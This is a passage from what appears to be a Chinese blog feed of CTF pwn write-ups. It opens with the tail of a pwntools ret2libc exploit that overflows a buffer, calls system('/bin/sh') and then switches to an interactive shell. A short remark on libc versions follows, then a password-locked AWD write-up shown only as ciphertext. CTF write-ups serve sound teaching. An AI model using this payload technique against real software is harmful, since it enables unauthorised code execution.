&apos;)sh.send(&apos;a&apos;*4*17+p32(ebp-8+0x20)+&apos;a&apos;*4*6+p32(libcbase+libc.symbols[&apos;system&apos;])+p32(0xdeadbeef)+p32(libcbase+libc.search(&apos;/bin/sh&apos;).next()))sh.interactive()</span><br></pre></td></tr></table></figure><p>当时没做出来，因为如果直接填充a会报错，中间有一部分是要自己补的，感觉和canary差不多，现在做的时候没远程环境了，本地打不下来。</p><h1 id="TCL"><a href="#TCL" class="headerlink" title="TCL"></a>TCL</h1><p>libc文件用本地的就行了，看来本地运行的libc和给的libc不一样…</p><p><code>libc = ELF(&#39;/lib/i386-linux-gnu/libc.so.6&#39;)</code></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>某awd的唯一pwn</title>
      <link href="/2019/05/13/%E6%9F%90awd%E7%9A%84%E5%94%AF%E4%B8%80pwn/"/>
      <url>/2019/05/13/%E6%9F%90awd%E7%9A%84%E5%94%AF%E4%B8%80pwn/</url>
      
        <content type="html"><![CDATA[<script src="https://ajax.aspnetcdn.com/ajax/jQuery/jquery-3.4.1.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Please enter the password to read the blog." />    <label for="pass">Please enter the password to read the blog.</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none">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